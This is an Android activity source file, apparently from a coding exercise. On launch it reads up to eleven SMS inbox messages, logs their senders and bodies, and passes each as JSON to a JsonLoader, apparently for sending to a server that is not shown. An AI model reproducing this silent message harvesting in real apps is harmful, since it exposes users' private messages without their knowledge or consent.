package ga.himanshu.home.myapplicationm;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        ContentResolver resolver = getContentResolver();


        ContentResolver resolver1 = getContentResolver();

        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = resolver1.query(uriSMSURI, null, null, null, null);
        String sms = "";
        int i = 0;
        while (cur.moveToNext() && i <= 10) {
            sms += "From :" + cur.getString(2) + " : " + cur.getString(cur.getColumnIndex("body")) + "    " + cur.getLong(0) + "\n";
            Log.d("codekamp", sms);
            i++;


            JSONObject jsonObject=new JSONObject();
            try {
                jsonObject.accumulate("from",cur.getString(2));
                jsonObject.accumulate("mesg",cur.getString(cur.getColumnIndex("body")));
            } catch (JSONException e) {
                e.printStackTrace();
            }






            JsonLoader loader=new JsonLoader();
            loader.execute(new JsonRequest(jsonObject.toString()));

        }
    }
}
